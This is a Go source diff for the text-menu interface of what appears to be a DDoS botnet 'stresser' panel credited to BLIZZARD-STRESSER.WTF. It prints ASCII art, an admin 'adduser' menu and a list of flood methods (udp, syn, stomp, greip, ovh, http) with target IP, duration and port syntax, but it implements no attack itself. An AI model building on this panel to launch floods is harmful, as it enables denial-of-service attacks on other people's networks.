@@ -1,0 +1,98 @@
+
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "os"
+    "strings"
+)
+
+
+func main() {
+    reader := bufio.NewReader(os.Stdin)
+    showStartup()
+    for {
+        fmt.Print("\x1b[0;37m[ \x1b[1;31m user\x1b[0;37m • \x1b[1;31msusano \x1b[0;37m ] \x1b[1;31m➤\x1b[0m \033[0m")
+        cmd, _ := reader.ReadString('\n')
+        cmd = strings.TrimSpace(cmd)
+        switch strings.ToLower(cmd) {
+        case "clear", "cls", "c":
+            showStartup()
+        case "help", "?":
+            showHelp()
+        case "methods":
+            showMethods()
+        case "admin":
+            showAdmin()
+        case "credits":
+            showCredits()
+        case "exit", "quit":
+            return
+        case "":
+            continue
+        default:
+            fmt.Println("Unknown command. Type 'help' for available commands.")
+        }
+    }
+}
+
+
+// ASCII art and menu functions
+func showStartup() {
+    fmt.Print("\033[2J\033[1;1H")
+    fmt.Print("\r\n")
+    fmt.Print("\x1b[1;31m      ██████  █    ██   ██████  ▄▄▄       ███▄    █  ▒█████  \t\t\x1b[0m \r\n")
+    fmt.Print("\x1b[1;31m    ▒██    ▒  ██  ▓██▒▒██    ▒ ▒████▄     ██ ▀█   █ ▒██▒  ██▒\t\t\x1b[0m \r\n")
+    fmt.Print("\x1b[1;31m    ░ ▓██▄   ▓██  ▒██░░ ▓██▄   ▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒\t\t\x1b[0m \r\n")
+    fmt.Print("\x1b[1;31m      ▒   ██▒▓▓█  ░██░  ▒   ██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░\t\t\x1b[0m \r\n")
+    fmt.Print("\x1b[1;31m    ▒██████▒▒▒▒█████▓ ▒██████▒▒ ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░\t\t\x1b[0m \r\n")
+    fmt.Print("\x1b[1;31m    ▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ \t\t\x1b[0m \r\n")
+    fmt.Print("\x1b[1;31m    ░ ░▒  ░ ░░░▒░ ░ ░ ░ ░▒  ░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ \t\t\x1b[0m \r\n")
+    fmt.Print("\x1b[1;31m    ░  ░  ░   ░░░ ░ ░ ░  ░  ░    ░   ▒      ░   ░ ░ ░ ░ ░ ▒  \t\t\x1b[0m \r\n")
+    fmt.Print("\x1b[1;31m          ░     ░           ░        ░  ░         ░     ░ ░  \t\t\x1b[0m \r\n")
+    fmt.Print("\r\n\r\n")
+}
+
+func showHelp() {
+    fmt.Print("\033[01;37m ╔-════════════════════════════════════-╗   \033[0m \r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31m METHODS : \033[01;37mATTACK PUSSY    \033[01;37m          ║   \033[0m \r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31m ADMIN : \033[01;37mADD ADMIN    \033[01;37m               ║   \033[0m \r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31m BOTS : \033[01;37mNUMBER BOTS    \033[01;37m              ║   \033[0m \r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31m CREDITS : \033[01;37mCREDITS   \033[01;37m                ║   \033[0m \r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31m CLS/CLEAR : \033[01;37mCLEAR TERMINAL    \033[01;37m      ║   \033[0m \r\n")
+    fmt.Print("\033[01;37m ╚-════════════════════════════════════-╝ \033[0m \r\n\n")
+}
+
+func showMethods() {
+    fmt.Print("\033[01;36m     -> | BLIZZARD-NET | <- \r\n")
+    fmt.Print("\033[01;31m ╔-════════════════════════════════════════════-╗   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m udp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m vse [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m dns [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m syn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m ack [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m stomp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m greip [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m std [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m] len=[\033[01;37m1400\033[01;37m]\033[01;31m║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m udpplain [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m           ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m xmas [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m               ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m ovh [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m asyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m    \t\t║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m usyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m\t\t║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ║ \033[01;37m http [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] domain=[\033[01;37mDOMAIN\033[01;37m] conns=5000\033[01;31m ║   \033[0m \r\n")
+    fmt.Print("\033[01;31m ╚-════════════════════════════════════════════-╝   \033[0m \r\n")
+}
+
+func showAdmin() {
+    fmt.Print("\033[01;37m ╔-═════════════════════════════════-╗\r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31madduser -> \033[01;37mAdd normal user  \033[01;37m║\r\n")
+    fmt.Print("\033[01;37m ╚-═════════════════════════════════-╝  \r\n")
+}
+
+func showCredits() {
+    fmt.Print("\033[01;37m ╔-═════════════════════════════════-╗\r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31mOwner: \033[01;37mBLIZZARD-STRESSER.WTF\t      \033[01;37m║\r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31mDeveloper: \033[01;37mRootSec\t      \033[01;37m║\r\n")
+    fmt.Print("\033[01;37m ╚-═════════════════════════════════-╝  \r\n")
+}
